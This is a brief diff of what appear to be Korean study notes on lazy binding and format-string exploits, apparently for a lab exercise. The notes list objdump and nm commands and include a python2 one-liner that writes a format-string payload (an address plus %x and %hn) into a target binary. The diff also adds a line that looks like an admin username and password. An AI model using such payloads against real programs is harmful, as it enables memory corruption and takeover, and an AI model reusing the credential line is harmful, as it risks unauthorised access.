@@ -72,3 +72,5 @@ Lazy Binding
 	1. objdump -R
 2. nm 명ㄹ여어
 3. python2 -c "print '\x24\xc0\x04\x08' + '%09x.'*7 + '37420%x' + '%hn'" +  | ./formatstring_formats12_32
+
+admin/UJE335003133
